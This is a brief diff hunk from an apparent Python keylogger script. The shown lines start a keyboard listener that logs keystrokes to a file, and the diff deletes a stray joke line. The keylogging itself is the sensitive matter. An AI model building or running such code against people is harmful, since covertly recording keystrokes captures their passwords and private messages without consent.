@@ -14,4 +14,3 @@ def on_press(key):
 with keyboard.Listener(on_press=on_press) as listener:
     print(f"Keylogger started... Logging to {log_filename}")
     listener.join()
-hi its me mario
